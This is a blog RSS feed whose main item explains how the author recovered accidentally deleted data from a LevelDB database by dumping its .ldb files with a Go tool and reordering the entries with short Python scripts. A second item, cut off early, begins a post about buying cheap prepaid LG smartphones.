<?xml version="1.0" encoding="utf-8" ?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>stuff by kevin kwok</title>
    <atom:link href="http://antimatter15.com/feed.xml" rel="self" type="application/rss+xml"></atom:link>
    <link>http://antimatter15.com</link>
    <description>somewhere to talk about ideas and projects and stuff like everyone else</description>
    <pubDate>Wed, 02 Dec 2015 12:53:44 -0500</pubDate>
    <generator>Wintersmith - https://github.com/jnordberg/wintersmith</generator>
    <language>en</language>
    <item>
      <title>Recovering Deleted Data from LevelDB</title>
      <link>http://antimatter15.com/2015/12/recovering-deleted-data-from-leveldb/</link>
      <pubDate>Wed, 02 Dec 2015 12:53:44 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/12/recovering-deleted-data-from-leveldb/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/LevelDB%20Recovery/hex-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;It was 4am this morning, and I did something stupid. I was trying to write something which would automatically delete all empty documents. Within a few seconds of running it, all my precious data was gone. Oops.&lt;/p&gt;
&lt;p&gt;There’s probably some grander lesson to be learned about keeping routine backups and not being an idiot. But the strength of that parable is somewhat weakened because I did manage to get the data back. &lt;/p&gt;
&lt;h2 id=&quot;how-leveldb-works&quot;&gt;How LevelDB Works&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://leveldb.org/&quot;&gt;LevelDB&lt;/a&gt;, developed by Sanjay Ghemawat and Jeff Dean of Google, is a fast key-value store based on a &lt;a href=&quot;http://paperhub.s3.amazonaws.com/18e91eb4db2114a06ea614f0384f2784.pdf&quot;&gt;log-structured merge tree&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;It’s not a relational database. It can’t do complex SQL queries. In fact, the only type of query that one can do is to ask for the set of entries whose keys fit lexicographically in some range. Think of it as a list of entities perpetually sorted by a key, where you can quickly read out any entry (or contiguous range) with a simple &lt;a href=&quot;https://en.wikipedia.org/wiki/Binary_search_algorithm&quot;&gt;binary search&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;It’s not just a metaphor— the basic primitive underlying LevelDB is literally called an SSTable (Sorted String Table). If you have a big arbitrarily large sorted list, the task of locating any single entity in a sorted list can be done in O(log n) time, which is nice because hopping around the big spinning metal hard disk platter is glacially slow in computer time. &lt;/p&gt;
&lt;!-- What's worse— inserting some new entry or deleting an old one may involve rewriting the whole file! --&gt;

&lt;p&gt;In RAM, hopping around is pretty fast. It’s part of the name— Random Access Memory. In RAM you can maintain a balanced &lt;a href=&quot;https://en.wikipedia.org/wiki/Binary_search_tree&quot;&gt;binary search tree&lt;/a&gt;, so that you can search, insert, delete, or update the contents of any entry in O(log n) time— all while keeping the contents sorted. &lt;/p&gt;
&lt;p&gt;Computers tend to have a limited amount of RAM compared to hard disk space, so most databases have to somehow deal with both beasts. To a certain extent, LevelDB plays to the strengths of each while using the other to fill in weaknesses. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/LevelDB%20Recovery/sstable-igvita.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Diagram taken from https://www.igvita.com/2012/02/06/sstable-and-log-structured-storage-leveldb/&lt;/div&gt;&lt;/div&gt;  &lt;/p&gt;
&lt;p&gt;To add some entry to the key-value store, LevelDB first sticks it into RAM— in particular some sort of data structure that keeps everything all nice and sorted. But over time, this chunk of memory may grow uncomfortably large, at which point its sorted contents get flushed into a file, and the old chunk of memory is emptied and ready for new data. &lt;/p&gt;
&lt;p&gt;Once data is saved to the disk, the saved SSTables are essentially treated as immutable. Otherwise, if you want to keep the data sorted you might have to rewrite the entire file whenever a new entry is added, or an old one is deleted. This immutability property is really what ends up saving me, because it means that in spite of deleting everything— nothing is ever truly lost. &lt;/p&gt;
&lt;p&gt;To look up some range of entries, LevelDB first checks RAM in case something matching the query has been manipulated recently. Then it checks the little immutable chunks which have already been flushed to disk, and merges them all together quickly in a manner similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Merge_sort&quot;&gt;merge sort&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;There’s some more to it which I haven’t covered, such as an append-only log to aid recovery in the event of some catastrophic power failure or software crash, and the process by which older SSTables get compacted together. But this essentially represents the basic design of an LSM database, at least enough to understand the principle of recovering deleted files. &lt;/p&gt;
&lt;h2 id=&quot;leveldb-structure&quot;&gt;LevelDB Structure&lt;/h2&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/LevelDB%20Recovery/files-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;When you save some stuff to a LevelDB database, what you find is actually a directory consisting of a couple of &lt;code&gt;.log&lt;/code&gt; files, &lt;code&gt;.ldb&lt;/code&gt; files, &lt;code&gt;MANIFEST&lt;/code&gt;, &lt;code&gt;CURRENT&lt;/code&gt;, &lt;code&gt;LOG&lt;/code&gt; and &lt;code&gt;LOCK&lt;/code&gt;. As far as I’m aware the log files are temporary and kept in case the database is interrupted before it has an opportunity to write things down into a sorted table. Thus I’ll pretend that after having cleanly exited the database (following accidentally deleting lots of stuff), all the content which might possibly be interesting is within the &lt;code&gt;.ldb&lt;/code&gt; files. &lt;/p&gt;
&lt;p&gt;If you try to open up an &lt;code&gt;.ldb&lt;/code&gt; in a hex editor, you’ll notice bits which look tantalizingly like the data you might want to recover, albeit subtly mangled by the Snappy compression algorithm. &lt;/p&gt;
&lt;h2 id=&quot;recovery&quot;&gt;Recovery&lt;/h2&gt;
&lt;p&gt;While you might imagine that being able to access previous versions of the data would be a natural and obvious affordance for a log-structured immutable append-only key-value store, I couldn’t find any APIs for accessing deleted data. &lt;/p&gt;
&lt;p&gt;A good first step might be figuring out some way to parse those &lt;code&gt;.ldb&lt;/code&gt; files. Fortunately, it’s &lt;a href=&quot;https://leveldb.googlecode.com/svn/trunk/doc/table_format.txt&quot;&gt;well-documented enough&lt;/a&gt; that there are actually &lt;a href=&quot;https://github.com/golang/leveldb/blob/master/table/table.go&quot;&gt;third-party implementations&lt;/a&gt;. And from the looks of it’s actually pretty simple.&lt;/p&gt;
&lt;p&gt;That golang leveldb repo is particularly cool because it includes a helper tool &lt;code&gt;ldbdump&lt;/code&gt; which reads in an &lt;code&gt;.ldb&lt;/code&gt; file and dumps its contents. In fact the whole process of using it was surprisingly rather painless. I just ran &lt;code&gt;go get github.com/golang/leveldb&lt;/code&gt;, navigated to the &lt;code&gt;cmd/ldbdump&lt;/code&gt; directory and ran &lt;code&gt;go build -o ldbdump main.go&lt;/code&gt;. I then wrote a little Python script which would call that program for all the &lt;code&gt;.ldb&lt;/code&gt; files in a particular directory and parse it into a more canonical JSON form. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='processing'&gt;&lt;/span&gt;base = &lt;span class=&quot;hljs-string&quot;&gt;&quot;test-stuff copy&quot;&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; os
from subprocess &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; Popen, PIPE
&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; json
&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; ast
&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; f in os.listdir(base):
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; f.endswith(&lt;span class=&quot;hljs-string&quot;&gt;&quot;.ldb&quot;&lt;/span&gt;):
    process = Popen([&lt;span class=&quot;hljs-string&quot;&gt;&quot;ldbdump&quot;&lt;/span&gt;, os.path.&lt;span class=&quot;hljs-built_in&quot;&gt;join&lt;/span&gt;(base, f)], stdout=PIPE)
    (output, err) = process.communicate()
    exit_code = process.wait()
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;line&lt;/span&gt; in (output.&lt;span class=&quot;hljs-built_in&quot;&gt;split&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;\n&quot;&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;:]):
      &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;line&lt;/span&gt;.strip() == &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-keyword&quot;&gt;continue&lt;/span&gt;
      parsed = ast.literal_eval(&lt;span class=&quot;hljs-string&quot;&gt;&quot;{&quot;&lt;/span&gt; + &lt;span class=&quot;hljs-built_in&quot;&gt;line&lt;/span&gt; + &lt;span class=&quot;hljs-string&quot;&gt;&quot;}&quot;&lt;/span&gt;)
      &lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt; = parsed.keys()[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]
      &lt;span class=&quot;hljs-built_in&quot;&gt;print&lt;/span&gt; json.dumps({ &lt;span class=&quot;hljs-string&quot;&gt;&quot;key&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt;.encode(&lt;span class=&quot;hljs-string&quot;&gt;'string-escape'&lt;/span&gt;), &lt;span class=&quot;hljs-string&quot;&gt;&quot;value&quot;&lt;/span&gt;: parsed[&lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt;] })
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Out of this I got a 73MB JSON file, which seemed to have all the contents in some form but unfortunately ordered by the key. This is bad because it conflates different versions of a particular key— an object may have been changed, deleted, and created again.  &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='tex'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&quot;value&quot;: &quot;&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;id&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;Whole Earth Catalog&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;type&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;text&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;parent&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;__root__&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;created&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:1447821578094,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;list&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-special&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;MI11NZ&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;&quot;, &quot;key&quot;: &quot;!entities/aleph!Whole Earth Catalog&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x01RI&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x05&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&quot;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&quot;value&quot;: &quot;&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;id&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;Wikia&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;type&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;text&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;parent&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;__root__&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;created&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:1447821578094,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;list&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-special&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;XB8UAU&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;&quot;, &quot;key&quot;: &quot;!entities/aleph!Wikia&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x01UI&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x05&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&quot;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&quot;value&quot;: &quot;&lt;span class=&quot;hljs-special&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;id&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;Will Ferrell&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;type&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;text&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;parent&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;__root__&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;created&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:1447841260204,&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;list&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-special&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;AKVVBF&lt;span class=&quot;hljs-command&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;&quot;, &quot;key&quot;: &quot;!entities/aleph!Will Ferrell&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x01=N&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x05&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&lt;span class=&quot;hljs-command&quot;&gt;\\&lt;/span&gt;x00&quot;&lt;span class=&quot;hljs-special&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One curious thing I noticed was the presence of some strange binary digits after the end of each key. After a little bit of experimentation it turns out that if you convert that binary string into a number, and sort the entire database by it, sticks all the changes in the proper chronological order!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='processing'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; sys
&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; json
&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; ast 
&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; binascii

things = []
&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;line&lt;/span&gt; in sys.stdin:
  obj = json.loads(&lt;span class=&quot;hljs-built_in&quot;&gt;line&lt;/span&gt;)
  halves = obj[&lt;span class=&quot;hljs-string&quot;&gt;'key'&lt;/span&gt;].&lt;span class=&quot;hljs-built_in&quot;&gt;split&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;\\x&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)
  &lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt; = ast.literal_eval(&lt;span class=&quot;hljs-string&quot;&gt;&quot;'\\x&quot;&lt;/span&gt; + halves[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;].replace(&lt;span class=&quot;hljs-string&quot;&gt;&quot;\\\\u00&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;\\x&quot;&lt;/span&gt;) + &lt;span class=&quot;hljs-string&quot;&gt;&quot;'&quot;&lt;/span&gt;)
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; len(&lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt;) == &lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;:
    time = &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;(binascii.hexlify(&lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;:][::-&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]), &lt;span class=&quot;hljs-number&quot;&gt;16&lt;/span&gt;)
    things.&lt;span class=&quot;hljs-built_in&quot;&gt;append&lt;/span&gt;((time, halves[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;], obj[&lt;span class=&quot;hljs-string&quot;&gt;'value'&lt;/span&gt;]))

&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; x in sorted(things, &lt;span class=&quot;hljs-variable&quot;&gt;key&lt;/span&gt; = lambda k: k[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]):
  &lt;span class=&quot;hljs-built_in&quot;&gt;print&lt;/span&gt; json.dumps(x)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And my precious data is now saved! Or well, rather, it always was— but now I finally have access to it in some reasonable form. &lt;/p&gt;
&lt;p&gt;I could see the first few entries, which happened to be some particularly fecal test data&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!changes/wumbo/!00000001448849217216&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;poop&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!entities/wumbo/!00000001448849471307&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;poop&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!changes/wumbo/!00000001448849471308&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;poop&quot;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then some data in the middle with an imported movie database&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;2435&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!changes/merp!000000014488557172160000001163&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Deja Vu&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;2437&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!changes/merp!000000014488557172160000001164&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Gattaca&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;2439&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!changes/merp!000000014488557172170000001165&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Sunshine&quot;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And of course, the part of it where I accidentally deleted everything&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;394061&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!entities/aleph!OYHEDW&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;394062&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!entities/aleph!Gerry Sussman&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;]
[&lt;span class=&quot;hljs-number&quot;&gt;394063&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;!entities/aleph!VSPKP8&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So I guess that’s it! In case you ever get stuck in a rut where you’ve unwittingly deleted the contents of your LevelDB and forgot to keep decent backups, and you’re lucky enough that the changes haven’t been compactified yet, you can possibly get your data back. &lt;/p&gt;
&lt;!-- 
There was a bit of a puzzle left, which was whether or not it was a timestamp. The first entry in the database was pretty small— just 78,128. I assumed that the epoch was set at the creation of the database, and from then kept counting. At the end of the file, that prefix number grew quite substantially to an 11 digit number.

    [78128, &quot;!changes/wumbo/!00000001448849217216&quot;, &quot;poop&quot;]
    ...
    [26339520816, &quot;!entities/aleph!@WZ1Y8ZF6F7594YEM$&quot;, &quot;{\&quot;type\&quot;:\&quot;text\&quot;,\&quot;id\&quot;:\&quot;@WZ1Y8ZF6F7594YEM$\&quot;,\&quot;text\&quot;:\&quot;Scratchpad 1\&quot;,\&quot;parent\&quot;:\&quot;2 December 2015\&quot;,\&quot;created\&quot;:1449050780995,\&quot;list\&quot;:[]}&quot;]

I had a few entries in the database that were actually tagged with timestamps, so I figured why not try to plot them against each other to see if there was a linear correspondence. 

![](plotly.png)

So it definitely didn't correspond linearly to a UNIX timestamp, but it did happen to look a lot like my own usage of the database. I had a big import at some point, and sort of slow, peaky interactions since then. I was also little curious what the spacing was. It turns out that each each one was exactly 131,072 apart from each other (which is kind of odd, because counters tend to go in increments of, well, one). A friend noticed 131,072 was 2^17, and so I . 
 --&gt;



&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='x86asm'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;57&lt;/span&gt; FB &lt;span class=&quot;hljs-number&quot;&gt;80&lt;/span&gt; 8B &lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;hljs-pseudo&quot;&gt;DB&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Optimistically Buying an Excessive Number of LG Optimus Exceed 2</title>
      <link>http://antimatter15.com/2015/08/optimistically-buying-an-excessive-number-of-lg-optimus-exceed-2/</link>
      <pubDate>Sat, 29  Aug 2015 23:23:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/08/optimistically-buying-an-excessive-number-of-lg-optimus-exceed-2/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Cheap%20Smartphone/all-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;At some point I developed a habit of perusing Slickdeals. I don’t have all that much disposable income, so I’ve been able to generally avoid making particularly embarassing and regrettable purchases. But some time in late August, I just saw a deal that was too good not to blow a hundred dollars on. &lt;/p&gt;
&lt;p&gt;Best Buy was having a sale for the &lt;a href=&quot;http://slickdeals.net/f/8173166-lg-optimus-exceed-2-no-contract-cell-phone-verizon-wireless-prepaid-7-99?src=SiteSearchV2&quot;&gt;prepaid LG Optimus Exceed 2&lt;/a&gt; Android Smartphone. It’s prepaid which means that there’s no service contract involved, and there’s a little &lt;a href=&quot;https://en.wikipedia.org/wiki/Konami_Code&quot;&gt;Konami-code&lt;/a&gt; esque incation to avoid activation (volume up, volume down, back button, home button). &lt;/p&gt;
